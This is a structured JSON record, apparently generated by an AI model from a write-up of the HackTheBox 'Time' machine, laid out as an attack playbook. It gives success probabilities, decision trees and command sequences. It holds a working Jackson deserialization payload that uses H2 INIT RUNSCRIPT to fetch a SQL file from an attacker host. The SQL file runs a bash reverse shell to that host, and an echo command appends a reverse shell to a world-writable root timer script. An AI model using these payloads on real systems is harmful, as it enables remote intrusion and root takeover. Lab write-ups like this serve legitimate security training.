{
  "writeup_id": "Htb_Time",
  "scenario_fingerprint": {
    "scenario_name": "linux_jackson_deserialization_systemd_timer",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80",
    "service_combination": "ssh+apache",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "jackson_deserialization",
    "privilege_path": "web_user_to_root_via_systemd",
    "attack_complexity": "medium",
    "estimated_time": "30-45 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "jackson_databind_vulnerability",
      "h2_database_driver_present",
      "world_writable_systemd_script",
      "json_validation_endpoint"
    ],
    "environmental_clues": [
      "java_backend_processing",
      "json_beautifier_application",
      "ubuntu_20.04_stack",
      "systemd_timer_privilege_escalation"
    ],
    "similar_scenarios": [
      "java_deserialization_boxes",
      "web_to_systemd_escalation"
    ],
    "unique_aspects": [
      "cve_2019_12384_jackson",
      "sql_injection_via_h2_init",
      "json_array_wrapper_error_message"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "Jackson Deserialization (CVE-2019-12384)",
        "success_reason": "Web application used vulnerable Jackson library with H2 database driver present",
        "prerequisite_indicators": [
          "java_web_application",
          "jackson_library_in_use",
          "h2_database_driver_available",
          "json_processing_endpoint"
        ],
        "recognition_patterns": [
          "Jackson error messages in responses",
          "JSON validation/beautification functionality",
          "Java stack traces mentioning com.fasterxml.jackson",
          "MismatchedInputException errors"
        ],
        "failure_modes": [
          "jackson_library_patched",
          "h2_driver_not_present",
          "deserialization_disabled",
          "input_validation_blocks_payload"
        ],
        "environmental_factors": [
          "unpatched_jackson_version",
          "default_h2_driver_installation",
          "permissive_deserialization_config",
          "web_application_has_database_connectivity"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "Systemd Timer Exploitation",
        "success_reason": "World-writable script executed by root timer every few seconds",
        "prerequisite_indicators": [
          "systemd_timers_running",
          "frequent_execution_intervals",
          "scripts_with_weak_permissions",
          "root_owned_timer_services"
        ],
        "recognition_patterns": [
          "timers with <5 minute intervals",
          "world-writable scripts in timer paths",
          "LinPEAS timer enumeration results",
          "systemctl list-timers output"
        ],
        "failure_modes": [
          "scripts_properly_secured",
          "no_frequent_timers",
          "apparmor_selinux_restrictions",
          "script_integrity_checks"
        ],
        "environmental_factors": [
          "default_systemd_configuration",
          "poor_file_permission_management",
          "automated_backup_scripts",
          "development_environment_practices"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "5-10 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Jackson deserialization vulnerability",
        "discovery_method": "Error message analysis and CVE research",
        "why_critical": "Direct path to remote code execution as web user",
        "how_to_recognize": [
          "Java stack traces in web responses",
          "Jackson library error messages",
          "JSON processing functionality",
          "MismatchedInputException patterns"
        ],
        "follow_up_actions": [
          "craft_h2_database_payload",
          "setup_http_server_for_sql_script",
          "test_with_ping_command",
          "deploy_reverse_shell_payload"
        ]
      },
      {
        "discovery": "timer_backup.timer frequent execution",
        "discovery_method": "LinPEAS systemd timer enumeration",
        "why_critical": "Root-level code execution every few seconds",
        "how_to_recognize": [
          "systemctl list-timers shows frequent intervals",
          "NEXT/LEFT columns show seconds",
          "LinPEAS highlights suspicious timers",
          "timer names suggest automation"
        ],
        "follow_up_actions": [
          "locate_timer_service_file",
          "identify_executed_script_path",
          "check_script_permissions",
          "modify_script_for_privilege_escalation"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_user_pericles",
        "escalation_method": "systemd_timer_script_modification",
        "why_possible": "World-writable script executed by root timer service",
        "recognition_signs": [
          "frequent_systemd_timers_present",
          "world_writable_script_files",
          "root_owned_timer_services",
          "backup_automation_scripts"
        ],
        "exploitation_path": "Modify world-writable script → Wait for timer execution → Root shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80 open on Linux host with JSON parser web application",
        "decision": "Test for JSON deserialization vulnerabilities",
        "reasoning": "Error message reveals Jackson databind library usage, known for deserialization CVEs",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "directory_enumeration",
            "when": "if deserialization fails"
          },
          {
            "option": "parameter_fuzzing",
            "when": "if no obvious vulns found"
          }
        ],
        "success_indicators": [
          "java_exception_in_response",
          "jackson_library_identified",
          "deserialization_error_messages"
        ],
        "next_decision": "identify_specific_jackson_cve"
      },
      {
        "step": 2,
        "situation": "Jackson databind deserialization vulnerability confirmed",
        "decision": "Use H2 database driver payload for RCE",
        "reasoning": "H2 driver commonly present and allows SQL script execution via INIT parameter",
        "confidence": 0.85,
        "prerequisites": [
          "jackson_vulnerable",
          "h2_driver_available"
        ],
        "success_indicators": [
          "http_request_to_controlled_server"
        ],
        "failure_fallbacks": [
          "try_other_jackson_gadgets",
          "ldap_gadgets",
          "rmi_gadgets"
        ]
      },
      {
        "step": 3,
        "situation": "RCE achieved via deserialization",
        "decision": "Establish reverse shell connection",
        "reasoning": "Interactive shell needed for privilege escalation enumeration",
        "confidence": 0.95,
        "prerequisites": [
          "rce_confirmed",
          "outbound_connectivity"
        ],
        "success_indicators": [
          "reverse_shell_established"
        ],
        "failure_fallbacks": [
          "file_write_and_cron",
          "bind_shell",
          "web_shell"
        ]
      },
      {
        "step": 4,
        "situation": "User shell obtained, need privilege escalation",
        "decision": "Check systemd timers for frequent execution",
        "reasoning": "Timers running every few seconds often indicate writable scripts",
        "confidence": 0.8,
        "prerequisites": [
          "user_shell_access"
        ],
        "success_indicators": [
          "timer_backup_service_found",
          "frequent_execution_pattern"
        ],
        "failure_fallbacks": [
          "sudo_permissions",
          "suid_binaries",
          "kernel_exploits"
        ]
      },
      {
        "step": 5,
        "situation": "Found systemd timer executing script every few seconds",
        "decision": "Check if timer script is world-writable",
        "reasoning": "Common misconfiguration in CTF environments",
        "confidence": 0.9,
        "prerequisites": [
          "timer_identified",
          "script_path_found"
        ],
        "success_indicators": [
          "script_writable_by_user"
        ],
        "failure_fallbacks": [
          "service_file_modification",
          "timer_file_modification"
        ]
      }
    ],
    "branching_logic": {
      "if_jackson_identified": {
        "action": "test_h2_database_payload",
        "tools": [
          "burp_suite",
          "curl"
        ],
        "next_phase": "rce_confirmation"
      },
      "if_rce_confirmed": {
        "action": "establish_reverse_shell",
        "tools": [
          "nc",
          "bash"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_user_shell_obtained": {
        "action": "run_automated_enumeration",
        "tools": [
          "linpeas",
          "systemctl"
        ],
        "focus": "systemd_timers_and_services"
      },
      "if_writable_timer_script_found": {
        "action": "append_privilege_escalation_payload",
        "tools": [
          "echo",
          "bash"
        ],
        "next_phase": "wait_for_timer_execution"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_error_messages_for_library_versions",
        "reasoning": "error_messages_reveal_backend_technologies_and_versions",
        "applicability": "web_application_testing"
      },
      {
        "rule": "prioritize_systemd_timers_under_5_minutes",
        "reasoning": "frequent_timers_often_indicate_privilege_escalation_opportunities",
        "applicability": "linux_privilege_escalation"
      },
      {
        "rule": "test_deserialization_with_common_gadgets_first",
        "reasoning": "h2_database_and_ldap_gadgets_have_high_success_rates",
        "applicability": "java_deserialization_attacks"
      },
      {
        "rule": "verify_rce_with_network_callbacks_before_shells",
        "reasoning": "confirms_execution_and_network_connectivity_simultaneously",
        "applicability": "remote_code_execution_testing"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "Jackson Deserialization",
        "mitre_id": "T1203",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "java_application_detected",
          "jackson_databind_library_present",
          "json_processing_endpoint_exists",
          "h2_database_driver_available"
        ],
        "success_indicators": [
          "jackson_error_messages_visible",
          "java_exception_stack_traces",
          "http_requests_to_external_urls",
          "sql_script_execution_successful"
        ],
        "incompatible_with": [
          "jackson_version_patched",
          "deserialization_disabled",
          "network_egress_blocked",
          "java_security_manager_enabled"
        ],
        "confidence_boosters": [
          "fasterxml_jackson_error_patterns",
          "json_validation_functionality",
          "database_connectivity_present",
          "unfiltered_error_messages"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Systemd Timer Privilege Escalation",
        "mitre_id": "T1053.006",
        "required_services": [
          "systemd"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "systemd_timers_present",
          "world_writable_scripts_exist",
          "timer_runs_as_root",
          "script_execution_frequent"
        ],
        "success_indicators": [
          "timer_files_in_system_directories",
          "writable_script_permissions",
          "root_owned_timer_service",
          "regular_execution_intervals"
        ],
        "incompatible_with": [
          "proper_file_permissions",
          "apparmor_restrictions",
          "selinux_enforcing",
          "script_integrity_checks"
        ],
        "confidence_boosters": [
          "default_systemd_configuration",
          "development_environment_indicators",
          "loose_file_permissions",
          "automated_task_patterns"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "5-15 minutes"
      }
    ],
    "environmental_detectors": {
      "java_web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443,
          9090
        ],
        "service_indicators": [
          "http",
          "https",
          "tomcat",
          "jetty"
        ],
        "banner_indicators": [
          "Apache",
          "Tomcat",
          "Jetty",
          "Spring"
        ],
        "error_patterns": [
          "java.lang",
          "com.fasterxml",
          "jackson",
          "springframework"
        ],
        "confidence_threshold": 0.8
      },
      "json_processing_service": {
        "endpoint_indicators": [
          "/api",
          "/json",
          "/validate",
          "/parse"
        ],
        "functionality_indicators": [
          "JSON Beautifier",
          "JSON Validator",
          "API endpoint"
        ],
        "library_indicators": [
          "jackson",
          "gson",
          "json-simple"
        ],
        "confidence_threshold": 0.85
      },
      "systemd_environment": {
        "os_indicators": [
          "Ubuntu",
          "Debian",
          "CentOS",
          "RHEL"
        ],
        "service_indicators": [
          "systemd"
        ],
        "directory_indicators": [
          "/etc/systemd",
          "/lib/systemd",
          "/run/systemd"
        ],
        "confidence_threshold": 0.95
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "jackson_deserialization",
          "when": "java_json_processing_detected",
          "reason": "direct_rce_no_authentication_needed"
        },
        {
          "attack": "systemd_timer_hijack",
          "when": "world_writable_scripts_found",
          "reason": "reliable_privilege_escalation"
        }
      ],
      "medium_priority": [
        {
          "attack": "web_directory_enumeration",
          "when": "web_service_detected",
          "reason": "may_reveal_additional_endpoints"
        }
      ],
      "low_priority": [
        {
          "attack": "ssh_bruteforce",
          "when": "ssh_service_detected",
          "reason": "time_consuming_low_success_rate"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "Jackson Deserialization RCE",
        "mitre_id": "T1203",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "curl/web_browser",
            "command_template": "POST to /validate with JSON: [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://{attacker_ip}/{payload}.sql'\"}]",
            "actual_command": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8/rev.sql'\"}]",
            "output_pattern": "HTTP request to attacker server for SQL file",
            "effectiveness_rating": 5,
            "reliability": 0.92
          },
          {
            "name": "python3_http_server",
            "command_template": "python3 -m http.server {port}",
            "actual_command": "sudo python3 -m http.server 80",
            "success_factors": [
              "h2_database_driver_present",
              "jackson_databind_vulnerable"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "jackson_databind_library_in_use",
          "h2_database_driver_available",
          "outbound_http_connections_allowed",
          "json_validation_endpoint_accessible"
        ],
        "success_indicators": [
          "http_request_received_for_sql_file",
          "reverse_shell_connection_established",
          "command_execution_confirmed"
        ],
        "common_failures": [
          "missing_h2_driver",
          "network_egress_filtering",
          "wrong_jackson_version",
          "payload_encoding_issues"
        ],
        "follow_up_techniques": [
          "privilege_escalation_via_systemd_timers",
          "ssh_key_persistence",
          "local_enumeration"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Systemd Timer Privilege Escalation",
        "mitre_id": "T1053.006",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "systemctl",
            "command_template": "systemctl list-timers --all",
            "actual_command": "systemctl list-timers --all",
            "output_pattern": "timer_backup.timer.*ACTIVATES",
            "effectiveness_rating": 4,
            "reliability": 0.98
          },
          {
            "name": "echo",
            "command_template": "echo 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1' >> {writable_script}",
            "actual_command": "echo -e '\\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' >> /usr/bin/timer_backup.sh",
            "success_factors": [
              "script_world_writable",
              "timer_runs_frequently"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "systemd_timers_present",
          "timer_script_writable",
          "timer_runs_as_root",
          "frequent_execution_schedule"
        ],
        "success_indicators": [
          "timer_identified_with_short_interval",
          "script_file_writable_by_current_user",
          "root_shell_obtained"
        ],
        "common_failures": [
          "script_not_writable",
          "timer_disabled",
          "selinux_preventing_execution",
          "shell_dies_quickly"
        ],
        "follow_up_techniques": [
          "ssh_key_installation",
          "persistent_backdoor_creation",
          "system_configuration_modification"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "LinPEAS",
        "use_case": "privilege_escalation_enumeration",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "linux_privilege_escalation"
        ],
        "alternatives": [
          "manual_enumeration",
          "linuxprivchecker"
        ],
        "best_practices": [
          "run_in_tmp_or_dev_shm",
          "focus_on_timers_under_5_minutes",
          "check_writable_files_in_system_paths"
        ]
      },
      {
        "tool": "H2_Database_JDBC",
        "use_case": "java_deserialization_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.88,
        "learning_curve": "medium",
        "essential_for": [
          "jackson_deserialization_attacks"
        ],
        "alternatives": [
          "other_jdbc_drivers",
          "direct_java_payloads"
        ],
        "best_practices": [
          "test_connectivity_first_with_simple_payload",
          "use_sql_alias_for_java_code_execution",
          "validate_h2_driver_presence"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "jackson_deserialization_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "python3 -m http.server 80",
            "purpose": "Start HTTP server to serve SQL payload",
            "expected_output": "Server listening on port 80"
          },
          {
            "step": 2,
            "command": "Create rev.sql with: CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\"bash\", \"-c\", cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; } $$; CALL SHELLEXEC('bash -c \"bash -i >& /dev/tcp/10.10.14.8/443 0>&1\"')",
            "purpose": "Create SQL payload with reverse shell",
            "expected_output": "SQL file created"
          },
          {
            "step": 3,
            "command": "Submit JSON: [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8/rev.sql'\"}]",
            "purpose": "Trigger deserialization vulnerability",
            "expected_output": "Reverse shell connection"
          }
        ],
        "success_rate": 0.92,
        "typical_duration": "5-15 minutes"
      },
      {
        "sequence_name": "systemd_timer_privilege_escalation",
        "steps": [
          {
            "step": 1,
            "command": "systemctl list-timers --all",
            "purpose": "Identify frequent systemd timers",
            "expected_output": "timer_backup.timer with short interval"
          },
          {
            "step": 2,
            "command": "find /etc/systemd/ -name timer_backup.service",
            "purpose": "Locate timer service definition",
            "expected_output": "/etc/systemd/system/timer_backup.service"
          },
          {
            "step": 3,
            "command": "ls -l /usr/bin/timer_backup.sh",
            "purpose": "Check script permissions",
            "expected_output": "World writable script file"
          },
          {
            "step": 4,
            "command": "echo -e '\\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' >> /usr/bin/timer_backup.sh",
            "purpose": "Add reverse shell to timer script",
            "expected_output": "Root shell within timer interval"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "10-20 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Time",
      "difficulty": "Medium",
      "os": "Ubuntu 20.04 Focal",
      "platform": "HackTheBox",
      "release_date": "2020-10-24",
      "author": "egotisticalSW, felamos",
      "estimated_time": "60-90 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "low",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "web_application",
        "deserialization",
        "systemd_timer"
      ],
      "key_vulnerabilities": [
        "json_deserialization",
        "world_writable_script",
        "cve_exploitation"
      ],
      "environment_type": "linux_web_server",
      "real_world_relevance": "high",
      "learning_value": [
        "deserialization_attacks",
        "systemd_exploitation",
        "cve_research"
      ],
      "prerequisite_knowledge": [
        "web_application_testing",
        "json_parsing",
        "linux_privilege_escalation"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "deserialization",
        "privilege_escalation",
        "cve_exploitation"
      ],
      "attack_types": [
        "remote_code_execution",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "secure_deserialization",
        "file_permissions",
        "systemd_security"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Arkham",
        "Fatty",
        "Jeeves"
      ],
      "similarity_reasons": [
        "deserialization_attacks",
        "json_exploitation",
        "web_to_system"
      ],
      "unique_aspects": [
        "systemd_timer_exploitation",
        "json_parser_interface",
        "straightforward_attack_path"
      ],
      "difficulty_factors": [
        "cve_research_required",
        "payload_crafting",
        "timing_based_escalation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T22:31:02.962920",
    "original_file": "0xdf_writeups/Htb Time.md",
    "content_length": 14671,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.9166666666666667,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.6666666666666666,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}